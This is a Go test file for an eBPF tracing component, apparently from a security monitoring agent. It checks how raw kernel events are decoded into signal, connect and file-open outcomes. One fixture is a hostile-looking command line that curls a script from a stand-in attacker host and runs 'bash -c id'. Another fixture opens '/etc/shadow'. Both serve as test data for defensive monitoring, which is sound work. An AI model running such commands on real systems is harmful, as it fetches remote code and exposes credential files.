package ebpf

import (
	"encoding/binary"
	"encoding/json"
	"strings"
	"testing"
)

func TestTraceSignalOutcomeABI(t *testing.T) {
	for _, tc := range []struct {
		attempted uint32
		result    uint32
		want      string
	}{{0, 0, "unknown"}, {1, 0, "accepted"}, {1, 1, "failed"}} {
		raw := make([]byte, TraceEventSize)
		binary.LittleEndian.PutUint32(raw[1408:1412], ActionKill)
		binary.LittleEndian.PutUint32(raw[1416:1420], tc.result)
		binary.LittleEndian.PutUint32(raw[1420:1424], tc.attempted)
		parsed, err := ParseRawTraceEvent(raw)
		if err != nil {
			t.Fatal(err)
		}
		if got := parsed.ToTraceEvent(0).SignalOutcome; got != tc.want {
			t.Errorf("attempted %d result %d: outcome %s want %s", tc.attempted, tc.result, got, tc.want)
		}
	}
}

func TestTraceActivityRequiresExitEvidence(t *testing.T) {
	for _, tc := range []struct {
		event uint32
		ret   int64
		want  string
	}{{TraceConnect, 0, "attempt"}, {TraceConnExit, 0, "success"}, {TraceConnExit, -111, "failure"}} {
		evt := (&RawTraceEvent{EventType: tc.event, RetVal: tc.ret}).ToTraceEvent(0)
		if evt.ActivityOutcome != tc.want {
			t.Fatalf("type %d ret %d: %s", tc.event, tc.ret, evt.ActivityOutcome)
		}
	}
}

func TestTraceConfigPreservesProtectedAgentIdentityWithoutCaptureFilter(t *testing.T) {
	cfg := traceConfigToBPF(TraceConfigAPI{FilterSelf: false}, 1234)
	if cfg.AgentPid != 1234 || cfg.FilterOwnPid != 0 {
		t.Fatal("capture filter disabled self-protection identity")
	}
}

func TestTraceExactProcessIdentityExtension(t *testing.T) {
	data := make([]byte, TraceEventSize)
	binary.LittleEndian.PutUint64(data[1424:1432], 123456789012345)
	evt, err := ParseRawTraceEvent(data)
	if err != nil {
		t.Fatal(err)
	}
	if evt.ProcessStartNs != 123456789012345 {
		t.Fatal("exact identity suffix lost")
	}
}

func TestTraceArgsBuffer512AndMultiArgJoin(t *testing.T) {
	if TraceEventSize != 1432 {
		t.Fatalf("TraceEventSize = %d, want 1432", TraceEventSize)
	}
	data := make([]byte, TraceEventSize)
	binary.LittleEndian.PutUint32(data[36:40], TraceExecve)
	// Kernel writes NUL-separated argv slots into the args region [352:1376].
	long := "curl -fsSL https://attacker.example.com/malicious_long_script.sh"
	copy(data[352:], long+"\x00-x bash -c id\x00")
	evt, err := ParseRawTraceEvent(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(evt.Args) != 1024 {
		t.Fatalf("Args buffer = %d bytes, want 1024", len(evt.Args))
	}
	te := evt.ToTraceEvent(0)
	want := long + " -x bash -c id"
	if te.Args != want {
		t.Fatalf("args join:\n got %q\nwant %q", te.Args, want)
	}
	desc := te.Description
	if !strings.Contains(desc, long) {
		t.Fatalf("description must include joined args, got %q", desc)
	}
}

func TestTraceArgsStringAllNulIsEmpty(t *testing.T) {
	data := make([]byte, TraceEventSize)
	evt, err := ParseRawTraceEvent(data)
	if err != nil {
		t.Fatal(err)
	}
	if evt.ToTraceEvent(0).Args != "" {
		t.Fatal("empty args region must render empty string")
	}
}

// rawOpenEvent is an open event as the object writes it: ret_val and the
// proc_flags word sit at fixed offsets of struct wafio_event.
func rawOpenEvent(t *testing.T, ret int64, procFlags uint32, size int) *RawTraceEvent {
	t.Helper()
	raw := make([]byte, size)
	binary.LittleEndian.PutUint32(raw[36:40], TraceOpen)
	binary.LittleEndian.PutUint64(raw[48:56], uint64(ret)) //nolint:gosec // G115: s64 reinterpreted as the kernel stores it
	copy(raw[96:], "/etc/shadow")
	if size >= TraceEventSizeWithIdentity {
		binary.LittleEndian.PutUint32(raw[1432:1436], procFlags)
	}
	parsed, err := ParseRawTraceEvent(raw)
	if err != nil {
		t.Fatal(err)
	}
	return parsed
}

// An open event reports success or failure only when the kernel recorded the
// result of the open (TRACE_EVT_OPEN_RESULT); every other open stays an
// attempt with ret_val 0, which the control plane reads as before.
func TestTraceOpenResultDecoding(t *testing.T) {
	for _, tc := range []struct {
		name    string
		ret     int64
		flags   uint32
		size    int
		outcome string
		wantRet int64
	}{
		{"descriptor", 7, traceEvtOpenResult, TraceEventSizeWithIdentity, "success", 7},
		{"descriptor zero", 0, traceEvtOpenResult, TraceEventSizeWithIdentity, "success", 0},
		{"denied", -13, traceEvtOpenResult, TraceEventSizeWithIdentity, "failure", -13},
		{"missing file", -2, traceEvtOpenResult, TraceEventSizeWithIdentity, "failure", -2},
		{"result unknown", 0, 0, TraceEventSizeWithIdentity, "attempt", 0},
		{"older object without identity flags", 0, 0, TraceEventSize, "attempt", 0},
		{"other event bits only", 0, traceEvtArgsUnreadable | traceProcProtected, TraceEventSizeWithIdentity, "attempt", 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			evt := rawOpenEvent(t, tc.ret, tc.flags, tc.size).ToTraceEvent(0)
			if evt.ActivityOutcome != tc.outcome || evt.RetVal != tc.wantRet {
				t.Fatalf("outcome %q ret %d, want %q %d", evt.ActivityOutcome, evt.RetVal, tc.outcome, tc.wantRet)
			}
		})
	}

	failed := rawOpenEvent(t, -13, traceEvtOpenResult, TraceEventSizeWithIdentity).ToTraceEvent(0)
	if !strings.Contains(failed.Description, "failed: permission denied") || strings.Contains(failed.Description, "Opened") {
		t.Errorf("failed open described as %q", failed.Description)
	}
	opened := rawOpenEvent(t, 5, traceEvtOpenResult, TraceEventSizeWithIdentity).ToTraceEvent(0)
	attempt := rawOpenEvent(t, 0, 0, TraceEventSizeWithIdentity).ToTraceEvent(0)
	if opened.Description != attempt.Description || !strings.HasPrefix(opened.Description, "Opened ") {
		t.Errorf("successful and unknown opens read %q and %q, want the same text", opened.Description, attempt.Description)
	}

	// What the control plane receives: a failed open carries a negative
	// ret_val, an open without a result carries none (the field is omitted).
	wire, err := json.Marshal(failed)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(wire), `"ret_val":-13`) || !strings.Contains(string(wire), `"activity_outcome":"failure"`) {
		t.Errorf("failed open on the wire: %s", wire)
	}
	wire, err = json.Marshal(attempt)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(wire), "ret_val") || !strings.Contains(string(wire), `"activity_outcome":"attempt"`) {
		t.Errorf("open without a result on the wire: %s", wire)
	}
}
